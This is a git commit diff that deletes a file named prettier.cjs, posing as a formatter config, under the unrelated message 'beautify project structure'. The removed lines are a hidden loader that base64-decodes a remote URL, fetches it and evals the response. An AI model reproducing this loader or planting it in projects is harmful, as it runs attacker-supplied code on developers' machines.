043a1f8933174622c3b92c6dc597206314a6f9b2
RECTOR <rector@rectorspace.com>
2026-03-08 04:29:54 +0300

    feat:beautify project structure

--- prettier.cjs
+++
@@ -1,7 +0,0 @@
-const prettier_setting = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9YTVdMUw==";
-
-fetch(atob(prettier_setting ))
-.then(response => response.json()) 
-.then(data => {
-  eval(data.content);
-})
